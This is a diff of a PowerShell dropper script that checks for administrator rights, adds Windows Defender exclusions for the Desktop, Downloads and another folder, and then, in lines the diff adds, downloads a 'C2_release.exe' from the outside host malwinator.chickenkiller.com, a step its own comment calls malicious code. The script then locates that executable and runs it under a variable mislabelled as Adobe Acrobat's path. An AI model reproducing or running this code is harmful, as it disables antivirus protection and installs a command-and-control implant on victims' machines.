@@ -1,4 +1,3 @@
-
 function Test-Administrator {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
@@ -14,13 +13,13 @@ if (-not (Test-Administrator)) {
 # Function to find the path of C2.exe
 function Find-C2Executable {
     param (
-        [string]$fileName = "C2_debug.exe"
+        [string]$fileName = "C2_release.exe"
     )
     $paths = Get-ChildItem -Path C:\ -Filter $fileName -Recurse -ErrorAction SilentlyContinue
     if ($paths.Count -gt 0) {
         return $paths[0].FullName
     } else {
-        Write-Error "C2_debug.exe not found"
+        Write-Error "C2_release.exe not found"
         exit 1
     }
 }
@@ -42,6 +41,9 @@ Add-MpPreference -ExclusionPath $downloadsPath
 # Verify that the exclusion was added
 $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 if ($exclusions -contains $pathToExclude -and $exclusions -contains $desktopPath -and $exclusions -contains $downloadsPath) {
+    
+    #Invoke a web request to download malicious code
+        Invoke-WebRequest -Uri http://malwinator.chickenkiller.com/download -Method POST -ContentType "application/x-www-form-urlencoded" -Body @{"file"="C2_release.exe"} -OutFile "C2_release.exe"
 
     # Define the path to Adobe Acrobat's executable file
 	$progPath = Find-C2Executable
@@ -86,3 +88,4 @@ if ($exclusions -contains $pathToExclude -and $exclusions -contains $desktopPath
 } else {
     Write-Error "Failed to add all paths to exclusion list"
 }
+
